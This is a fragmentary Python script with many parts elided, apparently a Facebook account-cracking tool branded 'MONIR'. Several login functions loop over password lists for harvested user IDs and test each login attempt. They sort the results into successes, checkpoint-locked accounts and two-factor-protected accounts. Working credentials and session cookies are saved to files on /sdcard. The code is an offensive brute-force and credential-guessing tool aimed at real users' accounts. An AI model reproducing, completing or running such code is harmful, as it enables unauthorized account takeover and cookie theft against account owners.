...
\033[1;32m      
  \033[1;32m    MONIR                              
===============================================
 [â¢]\033[1;37m AUTHOR       : \033[1;37m MONIR
 [â¢]\033[1;37m TOOL STATUS  :\033[1;37m RENDOM
...
def menu():
    ...
    elif devv =='5':os.system("xdg-open https://www.facebook.com/mdmonirhossen62");menu()
    elif devv =='6':exit()
    else:
...
def freefb(uid, name, pwx, tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [MONIR-M1] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
        ...
        for ps in pwx:
            ...
            if "c_user" in log_cookies:
                ...
                print(f" {green}[MONIR-OK] {uid}|{pw}")
                print(f" {white}[COOKIES] {green}{coki}")
                open("/sdcard/monir_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                oks.append(uid+"|"+pw)
                break
            elif "checkpoint" in log_cookies:
                if "Enter login code to continue" in log_cookies:
                    print(f" {cyan}[MONIR-2F] {uid}|{pw}")
                    open("/sdcard/monir_file_2F.txt", "a").write(f"{uid}|{pw}\n")
                    twf.append(uid+"|"+pw)
                    break
                else:
                   #print(f" {red}[MONIR-CP] {uid}|{pw}")
                    open("/sdcard/monir_file_cp.txt", "a").write(f"{uid}|{pw}\n")
                    cps.append(uid+"|"+pw)
                    break
            else:
                continue
...
def bapi(uid, name, pwx, tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [MONIR-M2] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
        ...
        for ps in pwx:
            ...
            if "session_key" in result:
                ...
                print(f" {red}[MONIR-CP] {uid}|{pw}")
                open("/sdcard/monir_file_tf.txt", "a").write(f"{uid}|{pw}\n")
                cps.append(uid+"|"+pw)
                break
            else:
                continue
...
def graph(uid, name, pwx, tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [MONIR-M3] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
...
def mbasic(uid,pwx,tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [M1-] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        for pw in pwx:
            data = {
                ...
                if "live" in c:
                    if result["is_account_confirmed"] == False:
                       ...
                       #print(f" {green}[COOKIES] {green}{coki}")
                        ...
                        print(f" {green}[MONIR-OK] {uid}|{pw}")
                       #print(f" {green}[COOKIES] {green}{coki}")
                        open("/sdcard/monir_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                        oks.append(uid)
                        break
            else:
                continue
...
def p(uid,pwx,tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [M2-] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        for pw in pwx:
            data = {
            ...
            if "session_key" in result:
                ...
                if "live" in c:
                    if result["is_account_confirmed"] == False:
                        print(f" {green}[MONIR-OK] {uid}|{pw}")
                       #print(f" {green}[COOKIES] {green}{coki}")
                        open("/sdcard/monir-ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                    else:
                        print(f" {green}[MONIR-OK] {uid}|{pw}")
                       #print(f" {green}[COOKIES] {green}{coki}")
                        open("/sdcard/monir_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
...
def x(uid,pwx,tl):
    ...
    global cps
    global devua
    sys.stdout.write('\r\33[1;37m[M3-] %s|OK:%s \r'%(loop,len(oks))),
    sys.stdout.flush()
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                if "live" in check_lock(cid):
                    if '%3A-1%3A-1' in coki:
                        print('\33[1;94m[MONIR-NV] '+cid+' | '+ps+'\33[0;97m')
                        break
                    else:
                        print('\33[1;92m[-OK] '+cid+' | '+ps+'\33[0;97m')
                        if "yes" in cookie_show:
                            print(f"\033[1;32mCOOKIES : {coki}")
                            open('/sdcard/monir-Rndm-Ok.txt', 'a').write(f'{cid}|{ps}|{coki}\n')
                            oks.append(cid)
                            break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                ...
                if "Enter login code to continue" in log_cookies:
                    ...
                    open('/sdcard/monir-2f.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                    break
                else:
                    #print('\33[1;91m[MONIR-CP] '+uid+' | '+ps+'\33[0;97m')
...
def mobile(uid,pwx,tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [M4-] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        for pw in pwx:
            data = {
            ...
            if "session_key" in result:
                ...
                if "live" in c:
                    if result["is_account_confirmed"] == False:
                        print(f" {green}[MONIR-OK] {uid}|{pw}")
                       #print(f" {green}[COOKIES] {green}{coki}")
                        open("/sdcard/monir.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                    else:
                        print(f" {green}[MONIR-OK] {uid}|{pw}")
                       #print(f" {green}[COOKIES] {green}{coki}")
                        open("/sdcard/monir_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
...
def freeq(uid,pwx,tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [M5-] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        for pw in pwx:
            data = {
...
def d(uid,pwx,tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [M6-] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        for pw in pwx:
            data = {
...
def cracker(uid, pwx, tl):
    ...
    global twf
    global loop
    sys.stdout.write(f"\r {green}(Monir) ({loop}) (OK-{len(oks)})\r"),
    sys.stdout.flush()
    try:
        first6digit = uid[0:6]
        first7digit = uid[0:7]
